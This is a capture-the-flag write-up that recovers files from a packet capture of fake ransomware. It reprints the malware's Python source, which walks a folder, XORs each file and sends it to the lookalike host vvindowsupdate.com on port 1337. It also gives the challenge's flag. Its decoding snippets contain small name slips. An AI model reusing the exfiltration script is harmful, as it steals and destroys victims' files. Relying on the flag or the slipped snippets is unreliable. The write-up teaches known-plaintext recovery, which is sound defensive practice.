# Description
Author: @Jstith

We received a plea for help from a rather frustrated looking employee. He said he accidently ran malware on his computer, but when he tried to pay the "leet hacker" to get his files back they said the malware was "broken"... best IT could do was provide us a PCAP.

Download the file(s) below.

# Files
`1337-malware.pcapng`

# Malware
When opening the capture in Wireshark, one of the first packets is a GET request to `vvindowsupdate.com` for `/rans.py` and it is soon followed by the response, which has the code: 

```py
import socket
import base64
import os
from random import randbytes
from pwn import xor

# DON'T FORGET TO CHANGE THIS TO THE REAL KEY!!!!
key = randbytes(32)

def encrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()
   
    encrypted = xor(data, key)
    return encrypted

def send_encrypted(filename):
    print(f'sending {filename}')
    data = encrypt(filename)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall((f'Sending: {filename}').encode())
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall(data)
    s.close()

def get_all_files():
    file_paths = []
    for root, dirs, files in os.walk(os.path.dirname(os.path.realpath(__file__))):
        for file in files:
            file_paths.append(os.path.join(root, file))
    file_paths.remove(__file__)      
    return file_paths

files = get_all_files()
for f in files:
    send_encrypted(f)
    #os.remove(f)
```

From this, we can see the "broken" part of the script is that the hacker doesn't know the key they used to XOR the data with. 
We can also see from the code that each time the data is transmitted, it's preceded by a packet giving the full path to the file. 

# Getting the key
From the code above, we know that we need a 32-bit key. We can get the key by XOR-ing the encoded data with known data. Looking at
the TCP streams in Wireshark, we can see that 5 files were transferred:
```
/home/davey/Documents/resources.zip
/home/davey/Documents/ecorp.png
/home/davey/Documents/Welcome Aboard.pdf
/home/davey/Documents/.ssh/id_rsa
/home/davey/Documents/.ssh/id_rsa.pub
```
Of these files, `id_rsa` will have predictable starting bytes because 
they all start with `-----BEGIN OPENSSH PRIVATE KEY-----`. I exported the 
encoded `id_rsa` into a file I named `rsaenc` and ran the following 
script to get the key. 

```py
from pwn import xor

f = open('rsaenc', 'rb')
rsadata = f.read()

rsa = b'-----BEGIN OPENSSH PRIVATE KEY-----'[:32]

key = xor(rsadata[:32], rsa)
```

# Getting the Flag
I started with the PDF file since I thought it was the most likely to have the flag. 
I exported the data from Wireshark into `pdfdata` and ran the following:

```py
f = open('pdfenc', 'rb')
pdfdata = f.read()
p = xor(pdfdata, key)
f = open('welcome.pdf', 'wb')
f.write(p)
```
The flag wasn't in there, but it did give me a password to the ZIP file. 
I exported it and decoded it in the same way

```py
f = open('zipenc', 'rb')
zdata = f.read()
z = xor(zdata, key)
f = open('resources.zip', 'wb')
f.write(r)
```

Inside the zip was a file called `flag.txt` which contained `flag{c95c4ff18b0eb88123de779051a7a24f}`
